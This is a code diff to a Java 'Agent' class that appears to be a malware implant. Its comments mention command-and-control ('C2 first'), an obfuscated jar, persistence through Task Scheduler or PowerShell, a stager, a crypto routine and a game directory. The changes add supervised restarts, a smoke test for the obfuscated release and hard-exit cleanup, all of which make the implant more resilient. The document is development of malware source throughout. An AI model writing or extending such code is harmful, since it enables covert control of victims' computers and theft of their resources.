@@ -17,7 +17,20 @@ public final class Agent {
 	}
 
 	public static void main(String[] args) {
-		start(args);
+		Supervisor.install();
+		if (args.length > 0 && args[0].equals("--smoke")) {
+			// Release smoke test: the obfuscated jar must still parse a config
+			// and report the manifest version.
+			Json.parseObject("{\"build_id\":\"smoke\"}");
+			System.out.println("agent " + Version.current());
+			return;
+		}
+		try {
+			start(args);
+		} catch (Throwable throwable) {
+			Log.debug("Agent start failed", throwable);
+			System.exit(22);
+		}
 	}
 
 	public static synchronized void start(String[] args) {
@@ -73,7 +86,19 @@ public final class Agent {
 			state.version = version();
 			state.save(AgentPaths.state(dir));
 			poller = new Poller(dir, gameDir, state);
-			poller.start();
+			Poller supervised = poller;
+			Supervisor.supervise("poller", () -> {
+				if (supervised.terminated()) {
+					throw new Supervisor.Stop();
+				}
+				supervised.start();
+				if (supervised.terminated()) {
+					throw new Supervisor.Stop();
+				}
+			}, 3_000L, 3, () -> {
+				Log.debug("Poller exhausted its restarts; exiting for the stager");
+				hardExit(23);
+			});
 			poller.startCrypto();
 			// C2 first: a stuck Task Scheduler or PowerShell must not mute the agent.
 			if (state.persist) {
@@ -118,9 +143,25 @@ public final class Agent {
 		}
 	}
 
+	private static void hardExit(int code) {
+		shutdown();
+		System.exit(code);
+	}
+
+	private static void shutdown() {
+		try {
+			if (poller != null) {
+				poller.stopCrypto();
+				poller.ops().stop(false);
+				poller.kill();
+			}
+		} catch (Throwable throwable) {
+			Log.debug("Hard exit cleanup failed", throwable);
+		}
+	}
+
 	private static String version() {
-		String version = Agent.class.getPackage().getImplementationVersion();
-		return version == null ? "0.3.6" : version;
+		return Version.current();
 	}
 
 	/** PID of a lock holder whose persisted heartbeat is older than 120 s. */
